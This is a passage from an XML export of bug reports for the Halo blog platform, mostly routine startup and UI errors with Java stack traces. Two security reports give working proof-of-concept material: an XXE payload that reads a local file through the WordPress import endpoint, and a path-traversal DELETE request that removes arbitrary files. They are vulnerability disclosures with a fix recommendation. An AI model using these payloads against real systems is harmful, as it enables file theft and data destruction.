		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/guide/faq.html --&gt;  ## 我的环境 升级1.2.0 版本 &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  ---  ## 错误日志  &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt;  rted by Flyway Pro Edition. at org.flywaydb.core.internal.database.base.Database.ensureDatabaseNotOlderThanOtherwiseRecommendUpgradeToFlywayEdition(Database.java:169) ~[flyway-core-6.1.0.jar!/:na] at org.flywaydb.core.internal.database.mysql.MySQLDatabase.ensureSupported(MySQLDatabase.java:278) ~[flyway-core-6.1.0.jar!/:na] at org.flywaydb.core.Flyway.execute(Flyway.java:495) ~[flyway-core-6.1.0.jar!/:na] at org.flywaydb.core.Flyway.migrate(Flyway.java:147) ~[flyway-core-6.1.0.jar!/:na] at run.halo.app.listener.StartedListener.migrate(StartedListener.java:86) ~[classes!/:1.2.0] at run.halo.app.listener.StartedListener.onApplicationEvent(StartedListener.java:58) ~[classes!/:1.2.0] at run.halo.app.listener.StartedListener.onApplicationEvent(StartedListener.java:33) ~[classes!/:1.2.0] at run.halo.app.listener.StartedListener$$EnhancerBySpringCGLIB$$da984ac1.onApplicationEvent(&lt;generated&gt;) ~[classes!/:1.2.0] at org.springframework.context.event.SimpleApplicationEventMulticaster.doInvokeListener(SimpleApplicationEventMulticaster.java:172) ~[spring-context-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.context.event.SimpleApplicationEventMulticaster.invokeListener(SimpleApplicationEventMulticaster.java:165) ~[spring-context-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:139) ~[spring-context-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:403) ~[spring-context-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:360) ~[spring-context-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.boot.context.event.EventPublishingRunListener.started(EventPublishingRunListener.java:98) ~[spring-boot-2.2.1.RELEASE.jar!/:2.2.1.RELEASE] at org.springframework.boot.SpringApplicationRunListeners.started(SpringApplicationRunListeners.java:71) ~[spring-boot-2.2.1.RELEASE.jar!/:2.2.1.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:321) [spring-boot-2.2.1.RELEASE.jar!/:2.2.1.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:1226) [spring-boot-2.2.1.RELEASE.jar!/:2.2.1.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:1215) [spring-boot-2.2.1.RELEASE.jar!/:2.2.1.RELEASE] at run.halo.app.Application.main(Application.java:35) [classes!/:1.2.0] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_65] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_65] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_65] at java.lang.reflect.Method.invoke(Method.java:497) ~[na:1.8.0_65] at org.springframework.boot.loader.MainMethodRunner.run(MainMethodRunner.java:48) [halo-latest.jar:1.2.0] at org.springframework.boot.loader.Launcher.launch(Launcher.java:87) [halo-latest.jar:1.2.0] at org.springframework.boot.loader.Launcher.launch(Launcher.java:51) [halo-latest.jar:1.2.0] at org.springframework.boot.loader.JarLauncher.main(JarLauncher.java:52) [halo-latest.jar:1.2.0] ---  ## 期望行为  这个会修复嘛。 &lt;!--   你期望会发生什么？ --&gt;  ## 当前行为  &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？    你可以粘贴截图或附件。 --&gt;</body>
		<created>2020-01-09 13:01:40</created>
		<closed>2020-01-09 14:01:50</closed>
	</bug>
	<bug>
		<id>483</id>
		<title>yaml配置mysql数据库没有效果</title>
		<body>我在自定义yaml文件里面已经开启了mysql，关闭了h2，但是使用docker运行起来之后，项目使用的还是H2数据库，而且mysql中没有新建表</body>
		<created>2020-01-09 04:42:57</created>
		<closed>2020-01-09 04:44:19</closed>
	</bug>
	<bug>
		<id>480</id>
		<title>dev 分支  跑起来后，访问管理系统出错</title>
		<body>如题，master分支没事，但是dev分支访问管理系统/admin 前端会提示404 后端也有错误信息： ``` org.springframework.web.util.NestedServletException: Request processing failed; nested exception is run.halo.app.exception.NotFoundException: Not Found at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:503) ~[jakarta.servlet-api-4.0.3.jar:4.0.3] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:590) ~[jakarta.servlet-api-4.0.3.jar:4.0.3] at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) ~[spring-web-5.2.1.RELEASE.jar:5.2.1.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:108) ~[spring-boot-actuator-2.2.1.RELEASE.jar:2.2.1.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.1.RELEASE.jar:5.2.1.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.1.RELEASE.jar:5.2.1.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.27.Final.jar:2.0.27.Final] at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) ~[undertow-core-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) ~[undertow-core-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) ~[undertow-core-2.0.27.Final.jar:2.0.27.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.27.Final.jar:2.0.27.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:269) [undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:78) [undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:133) [undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:130) [undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) [undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) [undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:249) [undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:78) [undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:99) [undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) [undertow-core-2.0.27.Final.jar:2.0.27.Final] at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) [undertow-core-2.0.27.Final.jar:2.0.27.Final] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_144] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_144] at java.lang.Thread.run(Thread.java:748) [na:1.8.0_144] Caused by: run.halo.app.exception.NotFoundException: Not Found at run.halo.app.controller.content.ContentContentController.content(ContentContentController.java:68) ~[main/:na] at run.halo.app.controller.content.ContentContentController$$FastClassBySpringCGLIB$$b6cfcb07.invoke(&lt;generated&gt;) ~[main/:na] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:769) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:88) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at run.halo.app.core.ControllerLogAop.controller(ControllerLogAop.java:48) ~[main/:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_144] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_144] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_144] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_144] at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:644) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:633) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:70) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:93) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:689) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at run.halo.app.controller.content.ContentContentController$$EnhancerBySpringCGLIB$$27b7046c.content(&lt;generated&gt;) ~[main/:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_144] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_144] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_144] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_144] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) ~[spring-web-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) ~[spring-web-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:888) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:793) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] ... 46 common frames omitted  ```</body>
		<created>2020-01-08 16:00:36</created>
		<closed>2020-01-09 02:12:45</closed>
	</bug>
	<bug>
		<id>478</id>
		<title>加入CNZZ图片形式 统计出错</title>
		<body>如题  加入CNZZ的图片形式 统计会提示：字段验证错误，请完善后重试！</body>
		<created>2020-01-08 04:17:38</created>
		<closed>2020-01-08 04:18:29</closed>
	</bug>
	<bug>
		<id>477</id>
		<title>文章底部的评论模块不显示图片</title>
		<body>在文章详情下有一个评论模块 然后有一个图标还是啥东西，图片加载不进来。我看了一下图片引用，是引用的cdn.v2ex.com/gravatar?d=monsterid  cdn.v2ex.com  这个站点崩了，然后会加载不到这个站点的图片。   还有，这里为什么会加载外部站点的图片呢。</body>
		<created>2020-01-08 02:51:08</created>
		<closed>2020-01-08 09:19:21</closed>
	</bug>
	<bug>
		<id>469</id>
		<title>输入错误的字符导致日志页面无法预期展示。</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/guide/faq.html --&gt;  ## 我的环境  Server 版本：1.2.0 Admin 版本：1.2.0 数据库：H2 运行模式：production UA 信息：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36  &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  ---  ## 错误日志  暂无。   &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt;  ---  ## 期望行为  期望能够正常按照字符串或按照换行来进行输出。  &lt;!--   你期望会发生什么？ --&gt;  ## 当前行为  查看 [halo-theme-simple-bootstrap](https://github.com/CodeLunatic/halo-theme-simple-bootstrap/issues/9)，以便于详细了解。  &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？    你可以粘贴截图或附件。 --&gt;</body>
		<created>2020-01-06 06:11:03</created>
		<closed>2020-01-06 06:31:30</closed>
	</bug>
	<bug>
		<id>468</id>
		<title>1.2.0 Flyway Enterprise Edition or MySQL upgrade required</title>
		<body>更新1.2.0以后提示  ``` Flyway Enterprise Edition or MySQL upgrade required: MySQL 5.6 is no longer supported by Flyway Community Edition, but still supported by Flyway Enterprise Edition. ```  ## 我的环境  mysql使用的是阿里云 rds，内核版本暂时无法更新  ---  ## 错误日志  ``` Flyway Enterprise Edition or MySQL upgrade required: MySQL 5.6 is no longer supported by Flyway Community Edition, but still supported by Flyway Enterprise Edition. ```  ---  ## 期望行为  正常启动执行  ## 当前行为  服务无法启动</body>
		<created>2020-01-05 15:38:15</created>
		<closed>2020-01-05 16:09:14</closed>
	</bug>
	<bug>
		<id>449</id>
		<title>上传图片空指针异常</title>
		<body>- [ x] BUG 反馈  ![image](https://user-images.githubusercontent.com/53456132/71539806-b7874300-297c-11ea-8e24-3f51ff85368d.png)  ![image](https://user-images.githubusercontent.com/53456132/71539807-bce48d80-297c-11ea-94b6-f1e0d6c7dc3e.png)  上传文件报空指针异常。  @ruibaby </body>
		<created>2019-12-28 06:17:51</created>
		<closed>2019-12-28 06:53:23</closed>
	</bug>
	<bug>
		<id>437</id>
		<title>修复了一个token存储的过期时间bug</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://halo.run/docs) - [x] [Halo 论坛](https://bbs.halo.run) - [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/halo-dev/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  存储 `access_token`的时候生成的过期时间是错误的，see https://github.com/halo-dev/halo/pull/435#issue-356039616</body>
		<created>2019-12-22 17:20:03</created>
		<closed>2019-12-23 01:24:57</closed>
	</bug>
	<bug>
		<id>423</id>
		<title>A XML external entity (XXE) vulnerability in the backend</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **I am sure I have checked**   - [x] [Halo User Guide Documentation ](https://halo.run/docs) - [x] [Halo BBS](https://bbs.halo.run) - [x] [Github Wiki ](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [Other Issues](https://github.com/halo-dev/halo/issues) ---- **I want to apply**   - [x] BUG feedback  There is a function of importing other blogs in the background. This function needs to parse the xml file, but it is not used for security defense, such as setFeature ("http://apache.org/xml/features/disallow-doctype-decl", true) ; ![image](https://user-images.githubusercontent.com/16250867/70616650-dfbb3600-1c49-11ea-8a18-65abbc6f1864.png) So there is a XML external entity (XXE) vulnerability，This vulnerability can detect the intranet, read files, ddos attacks, etc. Demonstrate reading files First construct an evil xml file. When the file is parsed, read the `/tmp/xxe.txt` file and put the result into the category list field. ![image](https://user-images.githubusercontent.com/16250867/70618618-480c1680-1c4e-11ea-9be2-5a80d56e5d60.png)  ```xml &lt;?xml version="1.0" encoding="UTF-8" ?&gt; &lt;!DOCTYPE a [ &lt;!ENTITY xxe SYSTEM "file:///tmp/xxe.txt"&gt; ]&gt;  &lt;rss version="2.0" xmlns:excerpt="http://wordpress.org/export/1.2/excerpt/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:wp="http://wordpress.org/export/1.2/" &gt; &lt;wp:category&gt;&lt;wp:term_id&gt;7&lt;/wp:term_id&gt;&lt;wp:category_nicename&gt;&amp;xxe;&lt;/wp:category_nicename&gt;&lt;wp:category_parent&gt;test&lt;/wp:category_parent&gt;&lt;wp:cat_name&gt;&amp;xxe;&lt;/wp:cat_name&gt;&lt;/wp:category&gt; &lt;wp:tag&gt;&lt;wp:term_id&gt;11&lt;/wp:term_id&gt;&lt;wp:tag_slug&gt;test&lt;/wp:tag_slug&gt;&lt;wp:tag_name&gt;&lt;![CDATA[test]]&gt;&lt;/wp:tag_name&gt;&lt;/wp:tag&gt; &lt;item&gt; &lt;title&gt;WordPress for SAE&lt;/title&gt; &lt;link&gt;http://github.com&lt;/link&gt; &lt;pubDate&gt;Mon, 21 Apr 2014 17:32:57 +0000&lt;/pubDate&gt; &lt;dc:creator&gt;&lt;![CDATA[zealseeker]]&gt;&lt;/dc:creator&gt; &lt;guid isPermaLink="false"&gt;http://github.com&lt;/guid&gt; &lt;description&gt;&lt;/description&gt; &lt;content:encoded&gt; &lt;![CDATA[]]&gt;&lt;/content:encoded&gt; &lt;excerpt:encoded&gt;&lt;![CDATA[]]&gt;&lt;/excerpt:encoded&gt; &lt;wp:post_id&gt;1&lt;/wp:post_id&gt; &lt;wp:post_date&gt;2014-04-22 01:32:57&lt;/wp:post_date&gt; &lt;wp:post_date_gmt&gt;2014-04-21 17:32:57&lt;/wp:post_date_gmt&gt; &lt;wp:comment_status&gt;open&lt;/wp:comment_status&gt; &lt;wp:ping_status&gt;open&lt;/wp:ping_status&gt; &lt;wp:post_name&gt;hello-world&lt;/wp:post_name&gt; &lt;wp:status&gt;draft&lt;/wp:status&gt; &lt;wp:post_parent&gt;0&lt;/wp:post_parent&gt; &lt;wp:menu_order&gt;0&lt;/wp:menu_order&gt; &lt;wp:post_type&gt;post&lt;/wp:post_type&gt; &lt;wp:post_password&gt;&lt;/wp:post_password&gt; &lt;wp:is_sticky&gt;0&lt;/wp:is_sticky&gt; &lt;category domain="category" nicename="uncategorized"&gt;&lt;![CDATA[未分类]]&gt;&lt;/category&gt; &lt;wp:postmeta&gt; &lt;wp:meta_key&gt;_edit_last&lt;/wp:meta_key&gt; &lt;wp:meta_value&gt;&lt;![CDATA[1]]&gt;&lt;/wp:meta_value&gt; &lt;/wp:postmeta&gt; &lt;/item&gt; &lt;channel&gt; &lt;/channel&gt; &lt;/rss&gt; ``` Upload this file to the system and get the file path `upload/2019/12/wp-66897ae127a54923a4987d1374420271.xml` Using the imported wordpress blog information interface to trigger a vulnerability ``` POST /api/admin/migrations/wordpress HTTP/1.1 Host: xxx:8090 Content-Length: 209 Admin-Authorization: b57cb92ad8ec451f8b8a04541028080f Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAOd7ukTz7mQkG2jP Origin: http:/xxx:8090 Referer: http://xxxx:8090/admin/index.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close  ------WebKitFormBoundaryAOd7ukTz7mQkG2jP Content-Disposition: form-data; name="file"; filename="test.xml" Content-Type: application/xml  /root/.halo/upload/2019/12/wp-66897ae127a54923a4987d1374420271.xml ------WebKitFormBoundaryAOd7ukTz7mQkG2jP-- ``` After sending the above message, you can see the contents of the `/tmp/xxe.txt` file in the background classification directory. ![image](https://user-images.githubusercontent.com/16250867/70617774-52c5ac00-1c4c-11ea-887f-ad52b034b63a.png)  Bug fix recommendations: setFeature ("http://apache.org/xml/features/disallow-doctype-decl", true) ; https://find-sec-bugs.github.io/bugs.htm#XXE_SAXPARSER</body>
		<created>2019-12-11 11:44:59</created>
		<closed>2019-12-12 17:08:25</closed>
	</bug>
	<bug>
		<id>422</id>
		<title>An Arbitrary file deletion vulnerability in the backend</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **I am sure I have checked**  - [x] [Halo User Guide Documentation ](https://halo.run/docs) - [x] [Halo BBS](https://bbs.halo.run) - [x] [Github Wiki ](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [Other Issues](https://github.com/halo-dev/halo/issues)  ---- **I want to apply**   - [x] BUG feedback  There is a backup function in the background. When we delete our backup files, we can delete any files on the system through directory traversal. ``` DELETE /api/admin/backups/halo?filename=../test.txt HTTP/1.1 Host: xxx:8090 Admin-Authorization: 19cfedbb4994443c8b3f7eebf9ef36b3 Accept: application/json, text/plain, */* User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 Origin: http://xxxx:8090 Referer: http://xx/admin/index.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ``` My backup file directory is at `/tmp/halo-backup/`. The above message can delete the test.txt file in the `/tmp` directory</body>
		<created>2019-12-11 11:06:14</created>
		<closed>2019-12-12 16:32:49</closed>
	</bug>
	<bug>
		<id>421</id>
		<title>An Arbitrary file writing vulnerability in the backend</title>
